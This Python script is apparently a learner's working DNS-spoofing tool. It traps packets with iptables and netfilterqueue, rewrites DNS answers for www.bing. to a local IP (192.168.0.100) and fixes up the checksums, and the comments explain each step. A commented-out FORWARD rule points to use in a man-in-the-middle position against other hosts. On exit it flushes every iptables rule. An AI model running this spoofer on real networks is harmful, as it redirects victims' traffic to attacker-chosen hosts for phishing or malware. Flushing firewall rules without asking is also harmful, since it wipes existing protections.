#!usr/bin/env python3

import netfilterqueue
import subprocess
import scapy.all as scapy


def check_root_or_not():
    try:
        scapy.srp(scapy.Ether(), verbose=False, timeout=0.5)
    except PermissionError:
        print("\n[-] Kindly re-run with root privileges.\n")
        exit(0)


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    # This creates a scapy_packet with same data/payload as that of our original queue packet! :D

    if scapy_packet.haslayer(scapy.DNSRR):  # DNSRR for DNS Response, and DNSQR for Question REQUEST packets :D
        # print(scapy_packet.show())
        # print(packet)  # Just prints packet name and size.

        website_name = scapy_packet[scapy.DNSQR].qname

        if "www.bing." in str(website_name):
            print("\n[+] Received Targeted DNS Req --> Spoofing Now...")

            modified_response = scapy.DNSRR(rrname=website_name, rdata="192.168.0.100")

            # This is to add modified response to scapy.packet and change Answer(an) count to '1'
            scapy_packet[scapy.DNS].an = modified_response
            scapy_packet[scapy.DNS].ancount = 1

            # This is to delete 'chksum' (verification code) and 'len' (length) in 'UDP' and 'IP' layers.
            # Upon deletion scapy recalculates and fills those fields back again :)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            print(scapy_packet.show())

            # Finally replacing original packet with this modified scapy_packet.
            packet.set_payload(bytes(scapy_packet))

    packet.accept()  # Forwards the packet to the router/target :)
    # packet.drop()  # Doesn't forward the packet to the router/target


check_root_or_not()

# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Creates a queue of all packets being forwarded, and traps them in the queue.
# --queue-num specifies the queue number we want.

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
# This is used to trap packets sent as OUTPUT by our own computer.
# And also The INPUT packets that are received by our computer too, since spoofing works both ways :)
# To test the working of our spoof_dns locally first :)

queue = netfilterqueue.NetfilterQueue()  # Created an instance of NetfilterQueue() to hold a netFilter queue.

queue.bind(0, process_packet)  # Callback function refers each packet in the queue to the specified function :)
# This binds our object 'queue' to the queue with num. '0' created above using iptables through subprocess

try:
    queue.run()  # This activates the queue; runs it! :D
except KeyboardInterrupt:
    print("\n\n[-] KeyboardInterrupt detected -- Exiting...\n")
    subprocess.call("iptables --flush", shell=True)  # restores iptables back to normal :)
    pass


